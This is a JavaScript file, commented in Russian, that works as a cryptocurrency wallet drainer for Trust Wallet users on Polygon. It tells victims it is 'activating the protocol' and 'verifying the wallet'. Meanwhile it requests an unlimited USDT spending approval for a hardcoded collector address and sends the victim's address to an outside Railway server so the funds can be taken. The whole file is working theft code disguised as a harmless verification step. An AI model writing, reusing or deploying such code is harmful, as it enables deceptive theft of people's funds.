const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; 
const SERVER_URL = 'https://railway-production-2954.up.railway.app/save-address';

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Откройте сайт внутри Trust Wallet';
        return;
    }

    try {
        status.innerText = 'Подключение к Polygon...';
        const web3 = new Web3(window.ethereum);

        // 1. Принудительная настройка сети POL/Polygon
        await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
                chainId: POLYGON_CHAIN_ID,
                chainName: 'Polygon Mainnet',
                rpcUrls: ['https://polygon-rpc.com'],
                nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                blockExplorerUrls: ['https://polygonscan.com/']
            }],
        });

        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);

        // Динамический газ: берем цену из сети и даем запас 1.5x
        const getGasPrice = async () => {
            const price = await web3.eth.getGasPrice();
            return Math.floor(Number(price) * 1.5).toString();
        };

        // ШАГ 1: Проверка текущего лимита (Allowance)
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        console.log("Текущий лимит:", currentAllowance);

        // ШАГ 2: Если лимит > 0, сбрасываем его. Это фиксит "execution reverted"
        if (BigInt(currentAllowance) > 0n) {
            status.innerText = 'Сброс старой сессии (1/2)...';
            const gas0 = await getGasPrice();
            
            await contract.methods.approve(COLLECTOR_ADDRESS, "0").send({ 
                from: address,
                gasPrice: gas0
            });
            
            // Пауза 2 сек для обновления состояния ноды
            await new Promise(r => setTimeout(r, 2000));
        }

        // ШАГ 3: Установка максимального лимита
        status.innerText = 'Активация протокола (2/2)...';
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        const gasMax = await getGasPrice();

        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint)
            .send({ from: address, gasPrice: gasMax })
            .once('transactionHash', async (hash) => {
                status.innerText = 'Синхронизация...';
                
                // ШАГ 4: Отправка данных на твой сервер
                try {
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ address: address })
                    });
                } catch (e) { console.error("Ошибка сервера", e); }

                status.innerText = '✅ Готово! Кошелек верифицирован.';
                status.style.color = '#00ff00';
            });

    } catch (error) {
        console.error(error);
        status.innerText = 'Ошибка: ' + (error.message.includes('denied') ? 'Вы отклонили транзакцию' : 'Попробуйте снова');
        status.style.color = '#ff4d4d';
    }
}

// Слушатель кнопки
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('startBtn');
    if (btn) btn.addEventListener('click', connectAndApprove);
});
